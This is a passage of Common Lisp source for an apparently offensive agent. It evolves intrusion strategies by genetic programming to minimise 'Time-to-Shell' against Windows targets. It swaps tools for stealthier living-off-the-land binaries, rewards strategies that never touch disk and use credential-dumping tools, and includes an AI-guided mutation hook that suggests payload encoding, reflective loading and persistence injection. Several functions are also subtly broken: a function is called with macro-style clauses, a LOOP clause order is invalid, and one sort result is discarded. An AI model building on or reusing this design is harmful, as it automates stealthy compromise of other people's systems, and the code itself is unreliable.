seed before creating variants.  This biases the starting population
toward stealthier strategies.

Parameters:
  SEED-CHROMOSOME  — The seed chromosome.
  POPULATION-SIZE  — Number of chromosomes to create.
  TERMINALS        — Terminal set (includes LOLBins).
  FUNCTIONS        — Function set.

Returns:
  List of STRATEGY-CHROMOSOME structs forming generation 0."
  (let* ((seed-expr (strategy-chromosome-expression seed-chromosome))
         (seed-id (strategy-chromosome-id seed-chromosome))
         ;; Apply LOLBin bias to seed: swap framework tools for LOLBins
         (biased-seed-expr (apply-lolbin-swap-all seed-expr))
         (biased-seed (make-strategy-chromosome
                       :expression biased-seed-expr
                       :fitness 0.0
                       :generation 0
                       :parent-ids (list seed-id)))
         (population (list biased-seed)))
    ;; Fill rest with LOLBin-aware mutations
    (loop repeat (1- population-size)
          do (let ((mutated-expr
                    (mutate-subtree-tts-optimized
                     biased-seed-expr
                     (1+ (random *max-gp-tree-depth*))
                     terminals functions)))
               (push (make-strategy-chromosome
                      :expression mutated-expr
                      :fitness 0.0
                      :generation 0
                      :parent-ids (list seed-id))
                     population)))
    (nreverse population)))

(defun apply-lolbin-swap-all (expression)
  "Apply LOLBIN-SWAP to ALL framework tools in the expression.

Recursively traverses the expression and replaces every framework tool
with its LOLBin equivalent (if one exists).

Parameters:
  EXPRESSION — S-expression tree to transform.

Returns:
  New S-expression with all framework tools replaced by LOLBins."
  (cond
    ;; Atom: check if it's a framework tool with LOLBin equivalent
    ((atom expression)
     (let ((equiv (lolbin-equivalent expression)))
       (if equiv
           (car equiv)  ; Return the first (quietest) LOLBin alternative
         expression)))
    ;; List: recursively transform children
    ((consp expression)
     (cons (car expression)
           (mapcar #'apply-lolbin-swap-all (cdr expression))))))

(defun evaluate-population-tts (population fitness-data)
  "Evaluate TTS fitness for every chromosome in POPULATION.

Calls TTS-FITNESS on each chromosome with FITNESS-DATA, storing the
result back into the chromosome's FITNESS slot.

Parameters:
  POPULATION   — List of STRATEGY-CHROMOSOME structs.
  FITNESS-DATA — Alist of TTS test cases.

Returns:
  POPULATION with updated fitness values."
  (dolist (chrom population)
    (tts-fitness chrom fitness-data))
  population)

(defun next-generation-tts (population terminals functions population-size generation-num)
  "Create the next generation with TTS-optimized operators.

Similar to NEXT-GENERATION but uses:
  • MUTATE-SUBTREE-TTS-OPTIMIZED for mutation (LOLBIN-SWAP, etc.)
  • CROSSOVER-SUBTREES-LOLBIN for crossover (LOLBIN-aware crossover)
  • TTS-fitness for evaluation

Parameters:
  POPULATION       — Current generation.
  TERMINALS        — Terminal set.
  FUNCTIONS        — Function set.
  POPULATION-SIZE  — Target population size.
  GENERATION-NUM   — Current generation number (for lineage tracking).

Returns:
  New list of STRATEGY-CHROMOSOME structs forming the next generation."
  (let ((new-population '())
        (elite (fittest-chromosome population)))
    ;; Elitism: preserve the champion
    (push (make-strategy-chromosome
           :expression (strategy-chromosome-expression elite)
           :fitness (strategy-chromosome-fitness elite)
           :generation generation-num
           :parent-ids (list (strategy-chromosome-id elite)))
          new-population)
    ;; Fill the rest
    (loop while (< (length new-population) population-size)
          for r = (random 1.0)
          do (cond
               ;; Crossover (75%) with LOLBin awareness
               ((< r *crossover-rate*)
                (multiple-value-bind (parent-a parent-b)
                    (select-parents population *tournament-size*)
                  (multiple-value-bind (child-expr-a child-expr-b)
                      (crossover-subtrees-lolbin
                       (strategy-chromosome-expression parent-a)
                       (strategy-chromosome-expression parent-b))
                    (push (make-strategy-chromosome
                           :expression child-expr-a
                           :fitness 0.0
                           :generation generation-num
                           :parent-ids (list (strategy-chromosome-id parent-a)
                                             (strategy-chromosome-id parent-b)))
                          new-population)
                    (when (< (length new-population) population-size)
                      (push (make-strategy-chromosome
                             :expression child-expr-b
                             :fitness 0.0
                             :generation generation-num
                             :parent-ids (list (strategy-chromosome-id parent-b)
                                               (strategy-chromosome-id parent-a)))
                            new-population)))))
               ;; Mutation (15%) with TTS-optimized operators
               ((< r (+ *crossover-rate* *mutation-rate*))
                (let ((parent (tournament-select population *tournament-size*)))
                  (let ((mutated (mutate-subtree-tts-optimized
                                   (strategy-chromosome-expression parent)
                                   *max-gp-tree-depth*
                                   terminals functions)))
                    (push (make-strategy-chromosome
                           :expression mutated
                           :fitness 0.0
                           :generation generation-num
                           :parent-ids (list (strategy-chromosome-id parent)))
                          new-population))))
               ;; Immigration: random individual with LOLBin bias
               ((= (length new-population) (1- population-size))
                (let ((random-expr (random-expression-tts *max-gp-tree-depth*
                                                           terminals functions)))
                  (push (make-strategy-chromosome
                         :expression random-expr
                         :fitness 0.0
                         :generation generation-num
                         :parent-ids '())
                        new-population)))
               ;; Direct copy (remaining probability)
               (t
                (let ((parent (tournament-select population *tournament-size*)))
                  (push (make-strategy-chromosome
                         :expression (strategy-chromosome-expression parent)
                         :fitness 0.0
                         :generation generation-num
                         :parent-ids (list (strategy-chromosome-id parent)))
                        new-population)))))
    (nreverse new-population)))

(defun crossover-subtrees-lolbin (expr-a expr-b)
  "Crossover with LOLBin awareness.

Standard CROSSOVER-SUBTREES but with a post-crossover LOLBin optimization:
if either child contains a framework tool with a LOLBin equivalent, there
is a 30% chance it will be swapped to the LOLBin version.

Parameters:
  EXPR-A, EXPR-B — Parent S-expressions.

Returns:
  Two values: the child S-expressions after crossover + LOLBin optimization."
  (multiple-value-bind (child-a child-b)
      (crossover-subtrees expr-a expr-b)
    ;; Post-crossover LOLBin optimization (30% chance per child)
    (values
     (if (< (random 1.0) 0.30)
         (apply-lolbin-swap-all child-a)
       child-a)
     (if (< (random 1.0) 0.30)
         (apply-lolbin-swap-all child-b)
       child-b))))

(defun random-expression-tts (max-depth terminals functions &key (method :mixed))
  "Generate a random expression with LOLBin bias.

Same as RANDOM-EXPRESSION but with a 40% chance that the root node will
be a LOLBin operation rather than a generic GP function.  This biases
random individuals toward actionable offensive operations.

Parameters:
  MAX-DEPTH  — Maximum tree depth.
  TERMINALS  — Terminal set (should include LOLBin terminals).
  FUNCTIONS  — Function set.
  METHOD     — :GROW, :FULL, or :MIXED (default).

Returns:
  S-expression with LOLBin bias applied."
  (let ((base-expr (random-expression max-depth terminals functions :method method)))
    ;; 40% chance: wrap in a LOLBin-favored operation
    (if (< (random 1.0) 0.40)
        (let ((lolbin-wraps '(progn if and)))
          (cons (nth (random (length lolbin-wraps)) lolbin-wraps)
                (list base-expr
                      (nth (random (length *lolbin-terminals*))
                           *lolbin-terminals*))))
      base-expr)))

(defun estimate-tts-from-chromosome (chromosome)
  "Estimate the Time-to-Shell for a chromosome without executing it.

This is a heuristic estimate based on the tools and techniques found in
the expression.  It provides a quick TTS estimate for logging and
selection purposes without requiring actual test execution.

Parameters:
  CHROMOSOME — STRATEGY-CHROMOSOME struct to estimate.

Returns:
  Float: estimated TTS in seconds (heuristic, not exact)."
  (let ((expr (strategy-chromosome-expression chromosome))
        (estimated-tts 30.0))  ; Default: 30 seconds
    (labels ((scan (node)
               (cond
                 ((atom node)
                  ;; Adjust TTS based on tool speed
                  (case-match-fast node
                    ;; Very fast tools (< 10s)
                    ((psexec.py wmiexec.py certutil.exe powershell-encoded
                      smbexec.py rpcclient)
                     (setf estimated-tts (min estimated-tts 10.0)))
                    ;; Fast tools (10-20s)
                    ((evil-winrm mshta.exe rundll32.exe regsvr32.exe ssh)
                     (setf estimated-tts (min estimated-tts 15.0)))
                    ;; Medium tools (20-45s)
                    ((nmap metasploit impacket sqlmap)
                     (setf estimated-tts (min estimated-tts 30.0)))
                    ;; Slow tools (45-120s)
                    ((nessus openvas bloodhound cobalt-strike)
                     (setf estimated-tts (min estimated-tts 60.0)))))
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan child))))))
      (scan expr)
      estimated-tts)))

(defun case-match-fast (sym cases)
  "Case-insensitive symbol match for TTS estimation.

Like CASE-MATCH but used in ESTIMATE-TTS-FROM-CHROMOSOME.

Parameters:
  SYM   — Symbol to check.
  CASES — List of symbols to match against.

Returns:
  T if SYM matches any symbol in CASES case-insensitively."
  (member sym cases :test #'symbol-match))

(defun evolve-strategy-via-tts (agent &key (model-id nil))
  "Hook: use TTS-optimized evolution with optional AI model guidance.

This is the top-level integration function that combines TTS-optimized
GP with optional AI model suggestions for mutation.  If MODEL-ID is
provided, the AI model is consulted for mutation suggestions that are
blended with the standard LOLBin-aware operators.

AI MODEL INTEGRATION (when MODEL-ID is non-NIL):
  1. Query the AI model for mutation suggestions based on current strategy.
  2. Parse suggestions into valid mutation operators.
  3. Blend AI suggestions with standard operators (50/50 weighting).
  4. Apply the blended mutation to the population.

Parameters:
  AGENT    — The agent to evolve.
  MODEL-ID — Optional AI model identifier for guided mutation.

Returns:
  Compiled function (evolved strategy), or NIL if evolution not triggered."
  (bt:with-lock-held ((agent-lock agent))
    (unless (should-evolve-p agent)
      (return-from evolve-strategy-via-tts nil))
    ;; Record AI-guided evolution
    (setf (gethash :last-evolution-time (agent-state agent)) (local-time:now))
    (setf (gethash :evolution-mode (agent-state agent))
          (if model-id :tts-ai-guided :tts-optimized))
    (when model-id
      (setf (gethash :ai-model-id (agent-state agent)) model-id))
    ;; Build seed
    (let* ((current-strategy (agent-strategy agent))
           (seed-expression (or (gethash :strategy-expression (agent-state agent))
                                (decompile-strategy current-strategy agent)))
           (seed-chromosome (make-strategy-chromosome
                             :expression seed-expression
                             :fitness 0.0
                             :generation 0))
           (fitness-data (or (gethash :fitness-data (agent-state agent))
                             (generate-default-tts-fitness-data agent)))
           (terminals (append *default-gp-terminals*
                              *lolbin-terminals*
                              (extract-terminals seed-expression)))
           (functions *default-gp-functions*)
           ;; If AI model provided, get guided mutations
           (ai-mutations (when model-id
                           (get-ai-mutation-suggestions model-id seed-expression)))
           ;; Run TTS evolution (with AI blending if available)
           (fittest (if ai-mutations
                        (evolve-strategy-tts-ai seed-chromosome fitness-data
                                                terminals functions
                                                ai-mutations)
                      (evolve-strategy-tts seed-chromosome fitness-data
                                           terminals functions
                                           :generations 5
                                           :population-size 20))))
      ;; Log with AI attribution if applicable
      (log-evolution agent seed-chromosome fittest)
      (when model-id
        (setf (gethash :ai-guided-evolution (agent-state agent)) t))
      ;; Store and compile
      (setf (gethash :strategy-expression (agent-state agent))
            (strategy-chromosome-expression fittest))
      (setf (gethash :evolution-generation (agent-state agent))
            (strategy-chromosome-generation fittest))
      (compile-chromosome fittest))))

(defun get-ai-mutation-suggestions (model-id seed-expression)
  "Get mutation suggestions from an AI model.

Placeholder for AI model integration.  When a model ID is provided,
this function queries the model for suggested mutations and returns
them as a list of S-expression templates.

Parameters:
  MODEL-ID       — Identifier for the AI model to query.
  SEED-EXPRESSION — Current strategy expression (context for suggestions).

Returns:
  List of S-expression templates suggested by the AI model, or NIL if
the model is unavailable or returns no suggestions."
  ;; Placeholder: In production, this would call an AI model API
  (declare (ignore model-id seed-expression))
  ;; Return a few sensible default mutations as placeholder
  '((progn (lolbin-swap agent) (encode-payload agent))
    (if (windows-target-p agent)
        (reflective-load (exploit-payload agent))
      (direct-exploit agent))
    (proxy-rotate (persistence-inject (exploit-chain agent)))))

(defun evolve-strategy-tts-ai (seed-chromosome fitness-data terminals functions
                                 ai-mutations)
  "TTS evolution with AI-guided mutations.

Runs EVOLVE-STRATEGY-TTS but injects AI-suggested mutations into the
population at a rate of 20% per generation.  This blends evolutionary
search with AI-generated intuition.

Parameters:
  SEED-CHROMOSOME — Seed chromosome.
  FITNESS-DATA    — TTS test cases.
  TERMINALS       — Terminal set.
  FUNCTIONS       — Function set.
  AI-MUTATIONS    — List of AI-suggested S-expression templates.

Returns:
  STRATEGY-CHROMOSOME — The fittest evolved chromosome."
  (let* ((seed-expr (strategy-chromosome-expression seed-chromosome))
         (seed-id (strategy-chromosome-id seed-chromosome))
         (population (initialize-population-tts seed-chromosome 20 terminals functions))
         (best-ever seed-chromosome))
    (loop for gen from 1 to 5
          do (evaluate-population-tts population fitness-data)
          (let ((gen-best (fittest-chromosome population)))
            (when (> (strategy-chromosome-fitness gen-best)
                     (strategy-chromosome-fitness best-ever))
              (setf best-ever gen-best))
            ;; Inject AI mutations (20% of population)
            (inject-ai-mutations population ai-mutations gen terminals functions)
            ;; Create next generation
            (when (< gen 5)
              (setf population (next-generation-tts population terminals functions
                                                     20 gen)))))
    best-ever))

(defun inject-ai-mutations (population ai-mutations generation-num terminals functions)
  "Inject AI-suggested mutations into the population.

Replaces 20% of the population's least-fit chromosomes with chromosomes
created from AI-suggested mutation templates.

Parameters:
  POPULATION    — Current population (modified in place).
  AI-MUTATIONS  — List of AI-suggested S-expression templates.
  GENERATION-NUM — Current generation number.
  TERMINALS      — Terminal set.
  FUNCTIONS      — Function set.

Returns:
  Modified POPULATION with AI mutations injected."
  (let ((inject-count (max 1 (floor (* 0.2 (length population))))))
    ;; Sort population by fitness (ascending) to find least fit
    (setf population (sort population #'< :key #'strategy-chromosome-fitness))
    ;; Replace least fit with AI mutations
    (loop for i from 0 below inject-count
          for mutation in ai-mutations
          do (setf (nth i population)
                   (make-strategy-chromosome
                    :expression (instantiate-ai-template mutation terminals)
                    :fitness 0.0
                    :generation generation-num
                    :parent-ids '(ai-suggested))))
    ;; Re-sort by fitness descending for selection
    (setf population (sort population #'> :key #'strategy-chromosome-fitness))
    population))

(defun instantiate-ai-template (template terminals)
  "Instantiate an AI mutation template with actual terminals.

Replaces placeholder symbols in the template (like AGENT) with actual
terminal values from the terminal set.

Parameters:
  TEMPLATE  — S-expression template with placeholders.
  TERMINALS — List of actual terminal values.

Returns:
  Instantiated S-expression with placeholders replaced."
  (labels ((instantiate (node)
             (cond
               ((eq node 'agent)
                (or (find 'agent terminals :test #'eq) 'agent))
               ((atom node)
                node)
               ((consp node)
                (cons (car node) (mapcar #'instantiate (cdr node)))))))
    (instantiate template)))

(defun generate-default-tts-fitness-data (agent)
  "Generate default TTS fitness data for an agent.

When no specific TTS test data is available, creates a default set that
rewards speed, stealth, and success.  The default data assumes a
Windows target environment with common LOLBins available.

Parameters:
  AGENT — The agent being evolved (context for target assumptions).

Returns:
  Alist of TTS test cases in the format expected by TTS-FITNESS."
  (declare (ignore agent))
  ;; Default TTS fitness data: reward fast, stealthy, successful strategies
  '(((:target . :windows-smb)
     (:actual-tts . 15.0)
     (:success-p . t)
     (:tools-used . (psexec.py))
     (:disk-touched-p . nil))
    ((:target . :windows-rdp)
     (:actual-tts . 45.0)
     (:success-p . t)
     (:tools-used . (wmiexec.py))
     (:disk-touched-p . nil))
    ((:target . :windows-http)
     (:actual-tts . 60.0)
     (:success-p . nil)
     (:tools-used . (metasploit/exploit))
     (:disk-touched-p . t))
    ((:target . :domain-joined)
     (:actual-tts . 20.0)
     (:success-p . t)
     (:tools-used . (secretsdump.py wmiexec.py))
     (:disk-touched-p . nil))
    ((:target . :standalone-windows)
     (:actual-tts . 30.0)
     (:success-p . t)
     (:tools-used . (certutil.exe powershell.exe))
     (:disk-touched-p . nil))))


;; ═══════════════════════════════════════════════════════════════════════════
;; ═══════════════════════════════════════════════════════════════════════════
;; BELOW: ALL EXISTING FUNCTIONS FROM evolution.lisp (v2.0) PRESERVED
;; These functions are maintained for backward compatibility and because
;; they form the foundation of the GP engine that v2.4 builds upon.
;; ═══════════════════════════════════════════════════════════════════════════
;; ═══════════════════════════════════════════════════════════════════════════

;; ── Section 1 (v2.0): Strategy Chromosome ─────────────────────────────────

(defstruct (strategy-chromosome
            (:constructor make-strategy-chromosome
              (&key expression fitness generation parent-ids
               &aux (id (gensym "CHROM-")))))
  "A strategy represented as an evolvable S-expression tree.

EXPRESSION  — The S-expression that encodes the strategy.  This is the
              genotype: a tree of function calls that, when compiled and
              executed, produces agent behavior.

FITNESS     — Float indicating how well this strategy performs.  Higher
              is better.  Computed by STRATEGY-FITNESS or TTS-FITNESS.

GENERATION  — Non-negative integer indicating which GP generation produced
              this chromosome.  Generation 0 = seed/initial strategy.

PARENT-IDS  — List of parent chromosome IDs for lineage tracking.

ID          — Unique identifier (auto-generated via GENSYM)."
  (id nil :type symbol :read-only t)
  (expression '(progn (default-strategy agent)) :type list)
  (fitness 0.0 :type float)
  (generation 0 :type (integer 0 *))
  (parent-ids '() :type list))

(defun chromosome-p (object)
  "Return T if OBJECT is a STRATEGY-CHROMOSOME struct."
  (typep object 'strategy-chromosome))

(defun chromosome< (a b)
  "Compare two chromosomes by fitness; A < B means A is less fit.

Used for tournament selection.  Higher fitness = better chromosome.
When fitness is equal, prefers smaller expressions (bloat control)."
  (if (= (strategy-chromosome-fitness a)
         (strategy-chromosome-fitness b))
      (> (tree-size (strategy-chromosome-expression a))
         (tree-size (strategy-chromosome-expression b)))
    (< (strategy-chromosome-fitness a)
       (strategy-chromosome-fitness b))))


;; ── Section 2 (v2.0): GP Parameters ───────────────────────────────────────

(defparameter *default-gp-functions*
  '(if progn and or > < = + - funcall not)
  "Default function set for GP trees.

IF      — Conditional execution (3 arguments)
PROGN   — Sequential evaluation
AND     — Logical conjunction
OR      — Logical disjunction
> < =   — Numeric comparisons
+ -     — Arithmetic
FUNCALL — Dynamic function call
NOT     — Logical negation")

(defparameter *default-gp-terminals*
  '(agent 0 1 2 3 5 10 25 50 100 nil t)
  "Default terminal set for GP trees.

AGENT     — The agent instance
0,1,2,... — Integer constants
NIL, T    — Boolean constants")

(defparameter *max-gp-tree-depth* 8
  "Maximum depth for randomly generated GP trees.  Default 8 balances
expressiveness with search efficiency.")

(defparameter *bloat-penalty-factor* 0.005
  "Penalty coefficient for expression complexity.  Fitness is reduced by
(* BLOAT-PENALTY-FACTOR tree-size) to prevent bloated strategies.")

(defparameter *mutation-rate* 0.15
  "Probability of subtree mutation.  Standard GP rate of 15%.")

(defparameter *crossover-rate* 0.75
  "Probability of subtree crossover.  Standard GP rate of 75%.")

(defparameter *tournament-size* 3
  "Number of chromosomes per tournament selection.  3 provides good
balance between selection pressure and diversity.")


;; ── Section 3 (v2.0): Tree Utilities ──────────────────────────────────────

(defun tree-size (tree)
  "Count the total number of nodes in TREE (an S-expression).

Each atom counts as 1.  Each list counts as 1 plus its children.
Used for bloat penalty and complexity tracking."
  (cond
    ((null tree) 1)
    ((atom tree) 1)
    (t (+ 1 (reduce #'+ (mapcar #'tree-size (cdr tree)) :initial-value 0)))))

(defun tree-depth (tree)
  "Compute the maximum depth of TREE (an S-expression).

An atom has depth 1.  A list has depth 1 + max child depth.
Used to enforce *MAX-GP-TREE-DEPTH*."
  (cond
    ((null tree) 1)
    ((atom tree) 1)
    (t (+ 1 (if (cdr tree)
                (reduce #'max (mapcar #'tree-depth (cdr tree)) :initial-value 0)
              0)))))

(defun random-subtree (tree)
  "Select a random subtree from TREE using uniform node selection.

Returns two values: the selected subtree and its address (path from root).
The address is a list of integer indices into successive CDR positions."
  (let ((nodes '()))
    (labels ((collect (addr subtree)
               (push (cons addr subtree) nodes)
               (when (consp subtree)
                 (loop for child in (cdr subtree)
                       for i from 0
                       do (collect (append addr (list i)) child)))))
      (collect '() tree)
      (let* ((choice (nth (random (length nodes)) nodes))
             (addr (car choice))
             (subtree (cdr choice)))
        (values subtree addr)))))

(defun replace-subtree (tree new-subtree address)
  "Replace the subtree at ADDRESS in TREE with NEW-SUBTREE.

ADDRESS is a list of integer indices as returned by RANDOM-SUBTREE.
If ADDRESS is NIL, replaces the entire tree."
  (if (null address)
      new-subtree
    (let ((index (first address))
          (rest-addr (rest address)))
      (if (consp tree)
          (let ((new-children
                 (loop for child in (cdr tree)
                       for i from 0
                       collect (if (= i index)
                                   (replace-subtree child new-subtree rest-addr)
                                 child))))
            (cons (car tree) new-children))
        new-subtree))))

(defun count-nodes (tree)
  "Count all nodes in TREE (alias for TREE-SIZE)."
  (tree-size tree))


;; ── Section 4 (v2.0): Random Expression Generation ────────────────────────

(defun random-terminal (terminals)
  "Select a random terminal from TERMINALS."
  (let ((choice (nth (random (length terminals)) terminals)))
    (if (numberp choice)
        choice
      choice)))

(defun random-function (functions)
  "Select a random function symbol from FUNCTIONS."
  (nth (random (length functions)) functions))

(defun function-arity (fn-symbol)
  "Return the arity of FN-SYMBOL for the standard GP function set."
  (case fn-symbol
    ((if) 3)
    ((not) 1)
    ((progn and or > < = + - funcall) 2)
    (otherwise 2)))

(defun random-expression (max-depth terminals functions &key (method :mixed))
  "Generate a random expression tree for genetic programming.

MAX-DEPTH — Maximum tree depth.
TERMINALS — List of terminal atoms.
FUNCTIONS — List of function symbols.
METHOD    — :GROW (variable depth), :FULL (full depth), or :MIXED (ramped)."
  (let ((actual-method
         (if (eq method :mixed)
             (if (zerop (random 2)) :grow :full)
           method)))
    (cond
      ((<= max-depth 0)
       (random-terminal terminals))
      ((eq actual-method :grow)
       (if (zerop (random 2))
           (random-terminal terminals)
         (let* ((fn (random-function functions))
                (arity (function-arity fn)))
           (cons fn
                 (loop repeat arity
                       collect (random-expression (1- max-depth)
                                                   terminals functions
                                                   :method :grow))))))
      ((eq actual-method :full)
       (if (<= max-depth 1)
           (random-terminal terminals)
         (let* ((fn (random-function functions))
                (arity (function-arity fn)))
           (cons fn
                 (loop repeat arity
                       collect (random-expression (1- max-depth)
                                                   terminals functions
                                                   :method :full))))))))))


;; ── Section 5 (v2.0): Mutation and Crossover ──────────────────────────────

(defun mutate-subtree (expression max-depth terminals functions)
  "Standard subtree mutation: replace a random subtree with a new one.

Selects a random subtree from EXPRESSION and replaces it with a randomly
generated tree of depth up to MAX-DEPTH.  This is the classic GP mutation
operator (Koza 1992).

Parameters:
  EXPRESSION — S-expression tree to mutate.
  MAX-DEPTH  — Maximum depth for the replacement subtree.
  TERMINALS  — List of terminal atoms.
  FUNCTIONS  — List of function symbols.

Returns:
  New S-expression with the mutation applied."
  (multiple-value-bind (subtree addr)
      (random-subtree expression)
    (declare (ignore subtree))
    (let ((new-subtree (random-expression (1+ (random max-depth))
                                          terminals functions
                                          :method :grow)))
      (replace-subtree expression new-subtree addr))))

(defun crossover-subtrees (expr-a expr-b)
  "Standard subtree crossover (sexual recombination).

Selects a random subtree from each parent and swaps them, producing two
offspring.  Each offspring inherits part of each parent's structure.

Parameters:
  EXPR-A, EXPR-B — Parent S-expressions.

Returns:
  Two values: the two child S-expressions."
  (multiple-value-bind (subtree-a addr-a)
      (random-subtree expr-a)
    (multiple-value-bind (subtree-b addr-b)
        (random-subtree expr-b)
      (values
       (replace-subtree expr-a subtree-b addr-a)
       (replace-subtree expr-b subtree-a addr-b)))))


;; ── Section 6 (v2.0): Chromosome Compilation ──────────────────────────────

(defun compile-chromosome (chromosome)
  "Compile a STRATEGY-CHROMOSOME's expression to an executable function.

Wraps the expression in (LAMBDA (AGENT) ...) and compiles it via CL:COMPILE.
The resulting function takes one argument (the agent) and executes the
strategy encoded in the chromosome's expression tree.

Parameters:
  CHROMOSOME — STRATEGY-CHROMOSOME struct to compile.

Returns:
  Compiled function object, or a fallback function if compilation fails."
  (handler-case
      (let ((expr (strategy-chromosome-expression chromosome)))
        (compile nil `(lambda (agent) ,expr)))
    (error (e)
      (format *trace-output* "[EVOLVE] Compilation failed: ~A~%" e)
      ;; Return fallback function
      (compile nil '(lambda (agent)
                      (declare (ignore agent))
                      nil)))))


;; ── Section 7 (v2.0): Fitness Evaluation (generic, preserved for compat) ──

(defun strategy-fitness (chromosome fitness-data)
  "Evaluate the fitness of a STRATEGY-CHROMOSOME (generic version).

This is the v2.0 generic fitness function, preserved for backward
compatibility.  For TTS-optimized operations, use TTS-FITNESS instead.

FITNESS-DATA is an alist of ((input . expected-output) ...) test cases.

Evaluation process:
  1. Compile the chromosome's expression to a function.
  2. For each test case: create mock agent, execute strategy, score result.
  3. Apply bloat penalty and robustness bonus.
  4. Return final fitness as a float."
  (let ((compiled-fn (compile-chromosome chromosome))
        (score 0.0)
        (all-passed t)
        (case-count 0))
    (dolist (test-case fitness-data)
      (let* ((input (car test-case))
             (expected (cdr test-case))
             (mock-agent nil)
             (result nil))
        (incf case-count)
        (handler-case
            (progn
              (setf mock-agent (make-agent :state (make-hash-table :test 'eq)))
              ;; Populate state from input
              (typecase input
                (list
                 (if (and (keywordp (first input))
                          (evenp (length input)))
                     ;; Plist
                     (loop for (key value) on input by #'cddr
                           do (setf (gethash key (agent-state mock-agent)) value))
                   ;; Alist
                   (loop for (key . value) in input
                         do (setf (gethash key (agent-state mock-agent)) value))))
              ;; Execute strategy
              (setf result (funcall compiled-fn mock-agent))
              ;; Score the result
              (let ((case-score (score-result result expected)))
                (incf score case-score)))
          (error (e)
            (declare (ignore e))
            (setf all-passed nil)))))
    ;; Robustness bonus
    (when (and all-passed (> case-count 0))
      (incf score 0.5))
    ;; Bloat penalty
    (let* ((tree-size (tree-size (strategy-chromosome-expression chromosome)))
           (penalty (* *bloat-penalty-factor* tree-size)))
      (decf score penalty))
    ;; Store and return
    (setf (strategy-chromosome-fitness chromosome) (float score 0.0))
    (float score 0.0)))

(defun score-result (actual expected)
  "Score a single test case result, returning a float in [0, 1].

Exact matches score 1.0.  Partial matches score 0.5.  Numeric results
use inverse relative error.  Mismatches score 0.0."
  (cond
    ((equalp actual expected) 1.0)
    ((and (keywordp actual) (keywordp expected)) 0.5)
    ((and (member actual '(t nil)) (member expected '(t nil)))
     (if (eq actual expected) 1.0 0.0))
    ((and (numberp actual) (numberp expected))
     (if (= expected 0)
         (if (= actual 0) 1.0 0.0)
       (max 0.0 (- 1.0 (/ (abs (- actual expected)) (abs expected))))))
    (t 0.0)))


;; ── Section 8 (v2.0): Selection ───────────────────────────────────────────

(defun tournament-select (population tournament-size)
  "Select the fittest chromosome from a random tournament.

POPULATION is a list of STRATEGY-CHROMOSOME structs.
TOURNAMENT-SIZE is the number of chromosomes randomly drawn.

Returns the fittest chromosome from the tournament."
  (let ((tournament
         (loop repeat tournament-size
               for idx = (random (length population))
               collect (nth idx population))))
    (reduce (lambda (a b)
              (if (> (strategy-chromosome-fitness a)
                     (strategy-chromosome-fitness b))
                  a b))
            tournament)))

(defun select-parents (population tournament-size)
  "Select two distinct parents using tournament selection.

Returns two values: parent-a and parent-b.  Guaranteed different
(up to 10 redrawing attempts)."
  (let ((a (tournament-select population tournament-size))
        (b nil))
    (loop repeat 10
          do (setf b (tournament-select population tournament-size))
          until (not (eq a b)))
    (values a (or b a))))


;; ── Section 9 (v2.0): The Evolutionary Engine ─────────────────────────────

(defun evolve-strategy (current-chromosome fitness-data
                        &key (generations 5) (population-size 20))
  "Evolve a strategy chromosome using tree-based genetic programming (v2.0).

This is the classic GP engine, preserved for backward compatibility.
For TTS-optimized evolution, use EVOLVE-STRATEGY-TTS.

Parameters:
  CURRENT-CHROMOSOME — Seed chromosome.
  FITNESS-DATA       — Alist of test cases.
  GENERATIONS        — Number of GP iterations (default 5).
  POPULATION-SIZE    — Chromosomes per generation (default 20).

Returns:
  STRATEGY-CHROMOSOME — The fittest chromosome from the final generation."
  (let* ((seed-expr (strategy-chromosome-expression current-chromosome))
         (seed-id (strategy-chromosome-id current-chromosome))
         (terminals (append *default-gp-terminals*
                            (extract-terminals seed-expr)))
         (functions *default-gp-functions*)
         (population (initialize-population current-chromosome
                                            population-size
                                            terminals functions))
         (best-ever current-chromosome)
         (generation-stats '()))
    (loop for gen from 1 to generations
          do (format *trace-output* "~&[EVOLVE] === Generation ~A/~A ===~%"
                     gen generations)
          (evaluate-population population fitness-data)
          (let ((gen-best (fittest-chromosome population)))
            (when (> (strategy-chromosome-fitness gen-best)
                     (strategy-chromosome-fitness best-ever))
              (setf best-ever gen-best))
            (push (list :generation gen
                        :best-fitness (strategy-chromosome-fitness gen-best)
                        :avg-fitness (average-fitness population)
                        :best-size (tree-size
                                    (strategy-chromosome-expression gen-best)))
                  generation-stats)
            (format *trace-output*
                    "~&[EVOLVE]   Best fitness: ~,3F | Avg: ~,3F | Best size: ~A~%"
                    (strategy-chromosome-fitness gen-best)
                    (average-fitness population)
                    (tree-size (strategy-chromosome-expression gen-best))))
          (when (< gen generations)
            (setf population (next-generation population terminals functions
                                               population-size gen))))
    (format *trace-output* "~&[EVOLVE] Evolution complete. Best fitness: ~,3F~%"
            (strategy-chromosome-fitness best-ever))
    best-ever))

(defun initialize-population (seed-chromosome population-size terminals functions)
  "Create the initial population for GP.

Position 0: seed chromosome.  Positions 1..N-1: random mutations of seed."
  (let ((population (list seed-chromosome)))
    (loop repeat (1- population-size)
          do (let ((mutated-expr (mutate-subtree
                                   (strategy-chromosome-expression seed-chromosome)
                                   (1+ (random *max-gp-tree-depth*))
                                   terminals functions)))
               (push (make-strategy-chromosome
                      :expression mutated-expr
                      :fitness 0.0
                      :generation 0
                      :parent-ids (list (strategy-chromosome-id seed-chromosome)))
                     population)))
    (nreverse population)))

(defun evaluate-population (population fitness-data)
  "Evaluate fitness for every chromosome in POPULATION using STRATEGY-FITNESS."
  (dolist (chrom population)
    (strategy-fitness chrom fitness-data))
  population)

(defun fittest-chromosome (population)
  "Return the chromosome with the highest fitness in POPULATION."
  (if (null population)
      (make-strategy-chromosome :expression '(progn (default-strategy agent)))
    (reduce (lambda (a b)
              (if (> (strategy-chromosome-fitness a)
                     (strategy-chromosome-fitness b))
                  a b))
            population)))

(defun average-fitness (population)
  "Compute the mean fitness of POPULATION.  Returns 0.0 if empty."
  (if (null population)
      0.0
    (/ (reduce #'+ (mapcar #'strategy-chromosome-fitness population))
       (length population))))

(defun next-generation (population terminals functions population-size generation-num)
  "Create the next generation from the current one.

Pipeline: 1. Elitism, 2. Crossover (75%), 3. Mutation (15%),
4. Immigration (1), 5. Direct copy (remaining)."
  (let ((new-population '())
        (elite (fittest-chromosome population)))
    ;; Elitism
    (push (make-strategy-chromosome
           :expression (strategy-chromosome-expression elite)
           :fitness (strategy-chromosome-fitness elite)
           :generation generation-num
           :parent-ids (list (strategy-chromosome-id elite)))
          new-population)
    ;; Fill rest
    (loop while (< (length new-population) population-size)
          for r = (random 1.0)
